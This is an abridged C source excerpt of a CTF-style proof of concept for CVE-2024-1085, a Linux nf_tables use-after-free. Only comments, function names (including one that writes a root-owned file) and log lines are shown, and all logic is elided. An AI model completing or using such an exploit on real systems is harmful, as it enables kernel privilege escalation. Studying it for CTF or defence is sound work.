/*
 * CVE-2024-1085 PoC - CTF Challenge Mode
 *
 * Vulnerability: nf_tables nft_setelem_catchall use-after-free
 *
...
static int mode_uaf(poc_args_t *args) {
    poc_log("Triggering CVE-2024-1085 UAF + spray corruption check...");
...
static int mode_write_root_file(const poc_args_t *args) {
    ...
    poc_log("Triggering CVE-2024-1085 UAF vulnerability...");
...
int main(int argc, char *argv[]) {
    ...
    poc_log("=== CVE-2024-1085 CTF PoC ===");
    poc_log("Vuln: nf_tables nft_setelem_catchall use-after-free");
